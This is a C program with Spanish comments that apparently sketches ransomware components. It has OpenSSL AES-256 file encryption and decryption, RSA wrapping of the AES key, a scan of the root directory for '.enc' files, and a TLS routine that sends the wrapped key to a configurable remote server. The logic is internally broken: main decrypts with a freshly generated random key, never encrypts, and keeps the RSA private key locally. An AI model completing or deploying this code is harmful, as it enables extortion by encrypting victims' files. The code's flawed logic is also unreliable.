#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/ec.h>
#include <openssl/bn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>

#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16
#define AES_BLOCK_SIZE 16
#define RSA_KEY_SIZE 2048
#define MAX_ATTEMPTS 3
#define SERVER_IP "127.0.0.1"  // Dirección IP del servidor remoto
#define SERVER_PORT 443        // Puerto para TLS
#define ROOT_DIRECTORY "/"    // Directorio raíz para buscar archivos .enc

// Función para manejar errores de OpenSSL
void handle_errors() {
    unsigned long err_code = ERR_get_error();
    if (err_code) {
        fprintf(stderr, "Error: %s\n", ERR_error_string(err_code, NULL));
    }
    abort();
}

// Función para generar una clave AES aleatoria
int generate_aes_key(unsigned char *key) {
    if (RAND_bytes(key, AES_KEY_SIZE) != 1) {
        handle_errors();
    }
    return 0;
}

// Función para generar un par de claves RSA
void generate_rsa_keys(RSA **rsa, unsigned char **public_key, unsigned char **private_key) {
    *rsa = RSA_new();
    BIGNUM *e = BN_new();
    BN_set_word(e, RSA_F4);
    if (!RSA_generate_key_ex(*rsa, RSA_KEY_SIZE, e, NULL)) {
        handle_errors();
    }
    BN_free(e);

    BIO *pub = BIO_new(BIO_s_mem());
    PEM_write_bio_RSAPublicKey(pub, *rsa);
    size_t pub_len = BIO_pending(pub);
    *public_key = malloc(pub_len + 1);
    BIO_read(pub, *public_key, pub_len);
    (*public_key)[pub_len] = '\0';
    BIO_free_all(pub);

    BIO *priv = BIO_new(BIO_s_mem());
    PEM_write_bio_RSAPrivateKey(priv, *rsa, NULL, NULL, 0, NULL, NULL);
    size_t priv_len = BIO_pending(priv);
    *private_key = malloc(priv_len + 1);
    BIO_read(priv, *private_key, priv_len);
    (*private_key)[priv_len] = '\0';
    BIO_free_all(priv);
}

// Función para cifrar una clave AES con una clave RSA
int rsa_encrypt_key(RSA *rsa, unsigned char *key, unsigned char **encrypted_key) {
    int key_len = RSA_size(rsa);
    *encrypted_key = malloc(key_len);
    int result = RSA_public_encrypt(AES_KEY_SIZE, key, *encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING);
    if (result == -1) {
        handle_errors();
    }
    return result;
}

// Función para cifrar un archivo con AES
int aes_encrypt_file(const char *in_filename, const char *out_filename, const unsigned char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    if (in_file == NULL) {
        fprintf(stderr, "Error al abrir el archivo de entrada: %s\n", in_filename);
        return 1;
    }

    FILE *out_file = fopen(out_filename, "wb");
    if (out_file == NULL) {
        fprintf(stderr, "Error al abrir el archivo de salida: %s\n", out_filename);
        fclose(in_file);
        return 1;
    }

    unsigned char iv[AES_IV_SIZE];
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        handle_errors();
    }

    fwrite(iv, 1, AES_IV_SIZE, out_file);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        handle_errors();
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        handle_errors();
    }

    unsigned char buffer[AES_BLOCK_SIZE];
    int bytes_read;
    while ((bytes_read = fread(buffer, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        unsigned char ciphertext[AES_BLOCK_SIZE];
        int ciphertext_len;
        if (EVP_EncryptUpdate(ctx, ciphertext, &ciphertext_len, buffer, bytes_read) != 1) {
            handle_errors();
        }
        fwrite(ciphertext, 1, ciphertext_len, out_file);
    }

    unsigned char final_ciphertext[AES_BLOCK_SIZE];
    int final_ciphertext_len;
    if (EVP_EncryptFinal_ex(ctx, final_ciphertext, &final_ciphertext_len) != 1) {
        handle_errors();
    }
    fwrite(final_ciphertext, 1, final_ciphertext_len, out_file);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);

    return 0;
}

// Función para desencriptar un archivo con AES
int aes_decrypt_file(const char *in_filename, const char *out_filename, const unsigned char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    if (in_file == NULL) {
        fprintf(stderr, "Error al abrir el archivo de entrada: %s\n", in_filename);
        return 1;
    }

    FILE *out_file = fopen(out_filename, "wb");
    if (out_file == NULL) {
        fprintf(stderr, "Error al abrir el archivo de salida: %s\n", out_filename);
        fclose(in_file);
        return 1;
    }

    unsigned char iv[AES_IV_SIZE];
    if (fread(iv, 1, AES_IV_SIZE, in_file) != AES_IV_SIZE) {
        handle_errors();
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        handle_errors();
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        handle_errors();
    }

    unsigned char buffer[AES_BLOCK_SIZE];
    int bytes_read;
    while ((bytes_read = fread(buffer, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        unsigned char plaintext[AES_BLOCK_SIZE];
        int plaintext_len;
        if (EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, bytes_read) != 1) {
            handle_errors();
        }
        fwrite(plaintext, 1, plaintext_len, out_file);
    }

    unsigned char final_plaintext[AES_BLOCK_SIZE];
    int final_plaintext_len;
    if (EVP_DecryptFinal_ex(ctx, final_plaintext, &final_plaintext_len) != 1) {
        handle_errors();
    }
    fwrite(final_plaintext, 1, final_plaintext_len, out_file);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);

    return 0;
}

// Función para procesar archivos .enc en un directorio
int process_enc_files(const char *directory, const unsigned char *key) {
    DIR *dir = opendir(directory);
    if (dir == NULL) {
        fprintf(stderr, "Error al abrir el directorio: %s\n", directory);
        return 1;
    }

    struct dirent *entry;
    int attempts = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, ".enc")) {
            char input_file[512];
            char output_file[512];
            snprintf(input_file, sizeof(input_file), "%s/%s", directory, entry->d_name);
            snprintf(output_file, sizeof(output_file), "%s/%s.dec", directory, entry->d_name);

            printf("Intentando desencriptar el archivo: %s\n", input_file);

            int result = aes_decrypt_file(input_file, output_file, key);
            if (result == 0) {
                printf("Desencriptado con éxito: %s\n", input_file);
                attempts = 0;  // Resetear el contador de intentos fallidos
            } else {
                printf("Fallo al desencriptar el archivo: %s\n", input_file);
                attempts++;
                if (attempts >= MAX_ATTEMPTS) {
                    printf("Número máximo de intentos fallidos alcanzado. Deteniendo el proceso.\n");
                    break;
                }
            }
        }
    }

    closedir(dir);
    return 0;
}

// Función para enviar claves cifradas al servidor remoto con TLS
int send_encrypted_key_to_server(unsigned char *encrypted_key, size_t key_len) {
    SSL_CTX *ctx;
    SSL *ssl;
    int server;
    struct sockaddr_in dest;

    // Inicializar OpenSSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    const SSL_METHOD *method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (ctx == NULL) {
        handle_errors();
    }

    dest.sin_family = AF_INET;
    dest.sin_port = htons(SERVER_PORT);
    dest.sin_addr.s_addr = inet_addr(SERVER_IP);

    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server < 0) {
        perror("Error al abrir el socket");
        return -1;
    }

    if (connect(server, (struct sockaddr *)&dest, sizeof(dest)) != 0) {
        perror("Error de conexión");
        return -1;
    }

    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, server);

    if (SSL_connect(ssl) != 1) {
        printf("Error en la conexión TLS\n");
        return -1;
    }

    // Enviar la clave cifrada al servidor
    if (SSL_write(ssl, encrypted_key, key_len) <= 0) {
        handle_errors();
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(server);
    SSL_CTX_free(ctx);

    return 0;
}

int main() {
    unsigned char aes_key[AES_KEY_SIZE];
    generate_aes_key(aes_key);

    // Procesar archivos en el directorio raíz
    process_enc_files(ROOT_DIRECTORY, aes_key);

    // Enviar clave cifrada al servidor remoto
    unsigned char *encrypted_key;
    RSA *rsa;
    unsigned char *public_key, *private_key;
    generate_rsa_keys(&rsa, &public_key, &private_key);
    rsa_encrypt_key(rsa, aes_key, &encrypted_key);
    send_encrypted_key_to_server(encrypted_key, RSA_size(rsa));

    // Liberar recursos
    RSA_free(rsa);
    free(public_key);
    free(private_key);
    free(encrypted_key);

    return 0;
}
